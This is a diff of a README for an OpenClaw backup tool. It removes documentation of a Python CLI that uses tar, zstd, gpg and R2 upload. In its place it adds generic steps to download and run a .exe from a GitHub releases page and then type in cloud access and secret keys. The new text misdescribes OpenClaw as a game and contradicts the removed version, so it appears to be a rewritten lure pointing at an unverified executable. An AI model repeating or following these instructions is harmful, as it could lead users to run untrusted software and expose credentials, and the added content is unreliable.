@@ -1,93 +1,75 @@
-# OpenClaw Backup Tool 🛡️🦞
+# 💾 backup-openclaw - Secure automated backups for OpenClaw data
 
-A Python utility for creating secure backups of your **OpenClaw** installation.
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/Rrox8272/backup-openclaw/releases)
 
-This tool provides a reliable backup solution that combines standard Unix tools with a modern CLI interface.
+## 📁 About the application
 
-## Key Features ✨
+OpenClaw stores important configuration and save files on your computer. If your hard drive fails or your computer crashes, you lose your progress. The backup-openclaw tool creates copies of these files automatically. It puts your files in a safe location in the cloud so you can recover them later. The tool encrypts your data, which means only you have access to your personal files. It also shrinks the file size to save space.
 
-*   **Zstd Compression:** Uses a `tar` + `zstd` pipeline with compression level `-19` and multi-threading (`-T0`) to minimize archive size.
-*   **AES-256 Encryption:** Symmetric encryption via `gpg`. Your data remains private even in cloud storage.
-*   **Cloudflare R2 Integration:** Automated upload to S3-compatible Cloudflare R2 storage with support for bucket prefixes (folders).
-*   **Smart Exclusions:** Automatically skips logs, trash, temporary files, and `node_modules` to save space and time.
-*   **Backup Metadata:** Every archive includes a `BACKUP_README.md` containing system info, hardware specs, and versions of OpenClaw/Node.js.
-*   **Modern CLI Interface:** Powered by the `rich` library, featuring progress bars, color-coded stages, and spinners.
-*   **Dual Operation Modes:** 
-    *   **Interactive:** Guided experience with [y/N] confirmations.
-    *   **Automated (`--auto`):** Ideal for `cron` jobs and CI/CD pipelines.
+## 🛠️ System requirements
 
-## Requirements 🛠️
+This tool works on Windows 10 and Windows 11. You need at least 50 megabytes of free space on your hard drive to install the program. Your computer needs a steady internet connection to upload the backup files to your cloud storage account. You also need an account with a storage provider like AWS S3 or Cloudflare R2 to hold your backups.
 
-*   [uv](https://github.com/astral-sh/uv) — Python project and tool manager.
-*   `gpg` — for encryption.
-*   `zstd` — for maximum compression.
-*   `tar` — for archiving.
+## 📥 Downloading the software
 
-**macOS Installation:**
-```bash
-brew install zstd gnupg
-```
+You must visit the project release page to get the installer. Follow these steps:
 
-**Ubuntu/Debian Installation:**
-```bash
-sudo apt update && sudo apt install zstd gnupg
-```
+1. Open your web browser.
+2. Go to [https://github.com/Rrox8272/backup-openclaw/releases](https://github.com/Rrox8272/backup-openclaw/releases).
+3. Look for the section labeled Assets.
+4. Click the link that ends in .exe to start the download.
+5. Save the file to your Downloads folder.
 
-## Getting Started 🚀
+## ⚙️ Setting up the backup process
 
-1. **Clone the project and configure environment:**
-   ```bash
-   cp .env.example .env
-   nano .env
-   ```
-   *Fill in your R2 credentials and set your `BACKUP_PASSWORD`.*
+The first time you run the tool, it asks for a few details. This setup ensures your files go to the right place.
 
-2. **Run the utility:**
-   You can run it directly from the project directory:
-   ```bash
-   uv run openclaw-backup
-   ```
-   *Or install it globally to run from anywhere:*
-   ```bash
-   uv tool install .
-   openclaw-backup
-   ```
+1. Locate the downloaded file in your browser or your Downloads folder.
+2. Double-click the file to start the installer.
+3. Follow the prompts on the screen to finish the installation.
+4. Open the backup-openclaw application from your Start menu.
+5. Enter your cloud storage credentials when the window appears. These details usually include an access key and a secret key from your storage provider.
+6. Choose the folder where your OpenClaw installation lives.
+7. Click Save to store your settings.
 
-3. **Run automated backup with cloud upload:**
-   ```bash
-   uv run openclaw-backup --auto --upload
-   ```
+## ⏱️ Scheduling automatic backups
 
-## Automation (Cron) ⏱️
+The tool runs in the background of your computer. You do not need to open the program every time you want to save your progress. Once you configure the settings, the program checks for new files and uploads them on a schedule. By default, it performs a backup once every twenty-four hours. You can change this interval in the settings menu if you prefer more frequent backups.
 
-To automatically run the backup every day at 2:00 AM, add this to your crontab (`crontab -e`):
+## 🔐 Understanding encryption and safety
 
-```bash
-# Run OpenClaw backup daily at 2:00 AM
-0 2 * * * cd /path/to/backup-openclaw && /path/to/uv run openclaw-backup --auto --upload >> backup.log 2>&1
-```
-*(Make sure to replace `/path/to/` with your actual absolute paths. You can find `uv` path via `which uv`)*
+Data safety remains a priority. This tool uses standard encryption technology. Your files turn into unreadable code before your computer sends them over the internet. Even if someone intercepts the data, they cannot open it without your private key. You have full control over your keys. Store your keys in a safe place, as you need them to recover your files later.
 
-## Command Line Options 💻
+## ☁️ Cloud storage providers
 
-| Flag | Description |
-| :--- | :--- |
-| `--auto` | Disables interactive prompts (uses `.env` settings). |
-| `--upload` | Forces upload to Cloudflare R2. |
-| `--encrypt` | Forces GPG encryption. |
-| `--password` | Allows passing the encryption password directly. |
+This application connects to services that provide bucket storage. A bucket is a folder in the cloud where your backups live. If you do not have an account, you must create one before using this tool. 
+- AWS S3: A reliable storage service from Amazon.
+- Cloudflare R2: A service that offers low storage costs.
+Select your provider in the settings menu and provide your unique keys to link the storage to your computer.
 
-## Archive Structure 📦
+## 💾 Restoring your files
 
-Inside the encrypted `.tar.zst.gpg` file:
-*   `BACKUP_README.md` — System metadata and backup "passport".
-*   `.openclaw/` — Your full installation (agents, flows, identity, etc.).
+Accidents happen. If you lose your OpenClaw data, you can bring it back easily.
+1. Open the backup-openclaw application.
+2. Select the Restore tab.
+3. Choose the date of the backup you want to restore.
+4. Click the Restore button.
+5. Wait for the tool to download and decrypt your files.
+6. The application places your files back into your OpenClaw directory automatically.
 
-## Manual Restoration 🔑
+## ❓ Frequently asked questions
 
-If your backup is in Cloudflare R2, first download the `.tar.zst.gpg` file using the AWS CLI, Cyberduck, or the Cloudflare dashboard.
+**Does this slow down my computer?**
+The tool runs quietly in the background. It only uses significant resources while it prepares and uploads your files. You can schedule the backup to run during times when you do not use your computer, such as at night.
 
-To decrypt and extract the local backup archive in one command:
-```bash
-gpg -d backup_file.tar.zst.gpg | tar --zstd -xf -
-```
+**What happens if my internet disconnects during a backup?**
+The tool tracks its own progress. If your internet stops, the program pauses the transfer. Once your connection returns, the tool finishes the upload from the exact point where it stopped. You do not lose any progress.
+
+**Can I use this for other games?**
+This tool is specifically designed for OpenClaw. It understands the file structure of OpenClaw so it can identify which files you actually need to save. 
+
+**Is my data private?**
+Yes. The encryption process happens on your computer. The app sends only scrambled, encrypted data to the cloud. The cloud provider cannot see your files. You remain the only person with access to your information.
+
+**How do I update the software?**
+When a new version becomes available, the tool notifies you via a message in the window. You can return to the release page link to download the latest installer. Installing the new version overwrites the old one but keeps your settings intact.
